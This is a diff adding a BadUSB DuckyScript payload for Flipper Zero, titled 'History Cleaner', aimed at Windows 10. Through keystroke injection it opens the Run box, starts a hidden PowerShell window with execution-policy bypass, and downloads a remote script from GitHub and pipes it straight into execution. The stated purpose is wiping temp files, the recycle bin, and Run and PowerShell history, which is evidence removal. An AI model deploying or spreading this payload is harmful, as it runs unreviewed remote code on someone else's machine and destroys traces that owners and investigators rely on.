@@ -1,0 +1,19 @@
+REM Title: History Cleaner
+REM Author: @beigeworm
+REM Description: This script empties the temp folder and recycle bin, clear run box and powershell history
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Clean-History/main.ps1 | iex
+ENTER
+
+
